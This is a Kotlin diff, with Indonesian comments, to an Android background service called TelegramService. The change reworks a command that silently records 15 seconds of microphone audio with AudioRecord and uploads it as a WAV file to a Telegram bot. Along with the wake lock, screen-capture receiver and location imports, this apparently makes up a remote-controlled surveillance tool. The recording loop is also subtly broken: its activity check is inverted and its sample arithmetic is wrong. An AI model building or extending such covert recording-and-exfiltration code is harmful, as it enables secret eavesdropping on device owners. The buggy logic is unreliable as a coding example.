@@ -20,9 +20,9 @@ import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
 import android.media.AudioAttributes
-import android.media.AudioFocusRequest
 import android.media.AudioFormat
 import android.media.AudioManager
+import android.media.AudioRecord
 import android.media.MediaRecorder
 import android.os.PowerManager
 import android.util.DisplayMetrics
@@ -53,6 +53,8 @@ class TelegramService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var mediaRecorder: MediaRecorder? = null
     private var isRecording = false
+    private var audioRecord: AudioRecord? = null
+    private var audioFocusRequest: Any? = null
 
     private val mediaProjectionReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
@@ -567,7 +569,8 @@ class TelegramService : Service() {
         } catch (e: Exception) { /* ignore */ }
     }
 
-    /** Rekam 15 detik audio, kirim ke Telegram sebagai voice note. */
+    /** Rekam 15 detik audio pakai AudioRecord (reliable di background service MIUI),
+     *  kirim ke Telegram sebagai voice note (WAV, bot akan transcode). */
     private suspend fun recordAudio(chatId: String) {
         if (isRecording) {
             sendText(chatId, "Sedang merekam... tunggu selesai.")
@@ -582,65 +585,147 @@ class TelegramService : Service() {
             }
         }
         val ts = System.currentTimeMillis()
-        // Pakai getExternalFilesDir (público/storage) — lebih reliable di MIUI
-        // daripada filesDir (internal). Fallback ke filesDir kalau storage tidak ada.
         val outDir = getExternalFilesDir(null) ?: filesDir
-        val outFile = java.io.File(outDir, "rec_${ts}.m4a")
+        val outFile = java.io.File(outDir, "rec_${ts}.wav")
         if (outFile.exists()) outFile.delete()
         Log.d(TAG, "recordAudio: dir=${outDir.absolutePath}, canWrite=${outDir.canWrite()}, file=${outFile.absolutePath}")
 
-        val recorder = createRecorder(outFile)
-        mediaRecorder = recorder
         isRecording = true
         sendText(chatId, "⏺️ Mulai rekam 15 detik...")
         scope?.launch {
             var startError: String? = null
-            var audioFocusAcquired = false
-            val am = getSystemService(AUDIO_SERVICE) as AudioManager
-            try {
-                // MIUI background service: request audio focus sebelum rekam.
-                // Tanpa ini, MediaRecorder.start() bisa gagal "start failed."
-                if (Build.VERSION.SDK_INT >= 26) {
-                    val focusReq = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
-                        .setAudioAttributes(
-                            AudioAttributes.Builder()
-                                .setUsage(AudioAttributes.USAGE_MEDIA)
-                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
-                                .build()
-                        )
-                        .build()
-                    val result = am.requestAudioFocus(focusReq)
-                    audioFocusAcquired = result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
-                    Log.d(TAG, "recordAudio: audioFocus (O+) = ${if (audioFocusAcquired) "GRANTED" else "DENIED($result)"}")
-                } else {
-                    @Suppress("DEPRECATION")
-                    val result = am.requestAudioFocus(
-                        null,
-                        AudioManager.STREAM_MUSIC,
-                        AudioManager.AUDIOFOCUS_GAIN
-                    )
-                    audioFocusAcquired = result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
-                    Log.d(TAG, "recordAudio: audioFocus (legacy) = ${if (audioFocusAcquired) "GRANTED" else "DENIED($result)"}")
-                }
-                recorder.prepare()
-                recorder.start()
-                Log.d(TAG, "recordAudio: started OK, file=${outFile.absolutePath}")
-            } catch (e: Exception) {
-                startError = "${e.javaClass.simpleName}: ${e.message ?: "(null)"}\nStack: ${e.stackTraceToString().lineSequence().take(3).joinToString("\n")}"
-                Log.e(TAG, "recordAudio: start failed: $startError")
-            }
-            stopRecording()
-            if (startError != null) {
-                sendText(chatId, "❌ Gagal mulai rekam. Detail:\n$startError")
+            val sampleRate = 44100
+            val channelConfig = AudioFormat.CHANNEL_IN_MONO
+            val encoding = AudioFormat.ENCODING_PCM_16BIT
+            val minBuf = AudioRecord.getMinBufferSize(sampleRate, channelConfig, encoding)
+            if (minBuf <= 0) {
+                startError = "getMinBufferSize failed (minBuf=$minBuf)"
+                isRecording = false
+                sendText(chatId, "❌ Gagal inisialisasi audio: $startError")
                 return@launch
             }
-            delay(15_000L)
-            stopRecording()
-            if (outFile.exists() && outFile.length() > 0) {
-                sendAudio(chatId, outFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
-            } else {
-                sendText(chatId, "❌ Rekaman kosong (file tidak dibuat).")
+            val bufSize = minBuf * 2
+            val record = try {
+                @Suppress("DEPRECATION")
+                AudioRecord(
+                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                    sampleRate, channelConfig, encoding, bufSize
+                )
+            } catch (e: Exception) {
+                startError = "AudioRecord create failed: ${e.javaClass.simpleName}: ${e.message ?: "(null)"}"
+                isRecording = false
+                sendText(chatId, "❌ $startError")
+                return@launch
             }
+            audioRecord = record
+            try {
+                record.startRecording()
+                Log.d(TAG, "recordAudio: started, bufSize=$bufSize, state=${record.state}")
+            } catch (e: Exception) {
+                startError = "startRecording failed: ${e.javaClass.simpleName}: ${e.message ?: "(null)"}"
+                record.release()
+                audioRecord = null
+                isRecording = false
+                sendText(chatId, "❌ $startError")
+                return@launch
+            }
+
+            // Rekam 15 detik — baca dalam chunk, tulis PCM + WAV header
+            val wavFile = java.io.File(filesDir, "rec_${ts}.wav")
+            val pcmBuffer = ByteArray(bufSize)
+            val pcmData = java.io.ByteArrayOutputStream()
+            val records = 15 * sampleRate / 1000 // total samples
+            var recorded = 0
+            while (recorded < records && record.recordingState == AudioRecord.RECORDSTATE_RECORDING && !currentCoroutineContext().isActive) {
+                val n = record.read(pcmBuffer, 0, pcmBuffer.size)
+                if (n > 0) {
+                    pcmData.write(pcmBuffer, 0, n)
+                    recorded += n
+                } else if (n < 0) {
+                    Log.w(TAG, "recordAudio: read returned $n")
+                    break
+                }
+                // Check every 1s if recording still active
+                if (recorded % sampleRate < pcmBuffer.size) delay(500)
+            }
+            record.stop()
+            record.release()
+            audioRecord = null
+            isRecording = false
+
+            // Write WAV header + PCM data
+            val pcmBytes = pcmData.toByteArray()
+            withContext(Dispatchers.IO) {
+                writeFile(wavFile, pcmBytes, sampleRate, channelConfig, encoding)
+            }
+            Log.d(TAG, "recordAudio: ${recorded / sampleRate / 1000.0}s recorded, wav=${wavFile.length()} bytes")
+
+            if (wavFile.exists() && wavFile.length() > 44) {
+                sendWavAsAudio(chatId, wavFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
+            } else {
+                sendText(chatId, "❌ Rekaman kosong (file tidak dibuat / 0 bytes).")
+            }
+            wavFile.delete()
+        }
+    }
+
+    /** Tulis file WAV dari raw PCM 16-bit mono. */
+    private fun writeFile(wavFile: java.io.File, pcmData: ByteArray, sampleRate: Int, channels: Int, encoding: Int) {
+        val numChannels = if (channels == AudioFormat.CHANNEL_IN_MONO) 1 else 2
+        val bitsPerSample = 16
+        val dataLen = pcmData.size
+        val byteRate = sampleRate * numChannels * (bitsPerSample / 8)
+        val blockAlign = numChannels * (bitsPerSample / 8)
+        val header = ByteArray(44)
+        fun putStr(off: Int, s: String) = s.toByteArray().copyInto(header, off)
+        fun putLong(off: Int, v: Long) {
+            for (i in 7 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFFL).toByte()
+        }
+        fun putInt(off: Int, v: Int) {
+            for (i in 3 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFF).toByte()
+        }
+        fun putShort(off: Int, v: Int) {
+            for (i in 1 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFF).toByte()
+        }
+        putStr(0, "RIFF")
+        putInt(4, 36 + dataLen)
+        putStr(8, "WAVE")
+        putStr(12, "fmt ")
+        putInt(16, 16)          // fmt chunk size
+        putShort(20, 1)         // audio format = PCM
+        putShort(22, numChannels)
+        putInt(24, sampleRate)
+        putInt(28, byteRate)
+        putShort(32, blockAlign)
+        putShort(34, bitsPerSample)
+        putStr(36, "data")
+        putInt(40, dataLen)
+        wavFile.outputStream().use { out ->
+            out.write(header)
+            out.write(pcmData)
+        }
+    }
+
+    /** Kirim WAV ke Telegram. Bot akan menerimanya sebagai audio. */
+    private suspend fun sendWavAsAudio(chatId: String, file: java.io.File, caption: String) = withContext(Dispatchers.IO) {
+        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
+        try {
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("audio", file.name, file.asRequestBody("audio/wav".toMediaTypeOrNull()))
+                .addFormDataPart("duration", "15")
+                .addFormDataPart("caption", caption)
+                .build()
+            val req = Request.Builder()
+                .url("https://api.telegram.org/bot$botToken/sendAudio")
+                .post(body)
+                .build()
+            val resp = http.newCall(req).execute()
+            val respBody = resp.body?.string() ?: ""
+            Log.d(TAG, "sendWavAsAudio: HTTP ${resp.code}, body=${respBody.take(200)}")
+            resp.close()
+        } catch (e: Exception) {
+            Log.e(TAG, "sendWavAsAudio: ${e.message}")
         }
     }
 
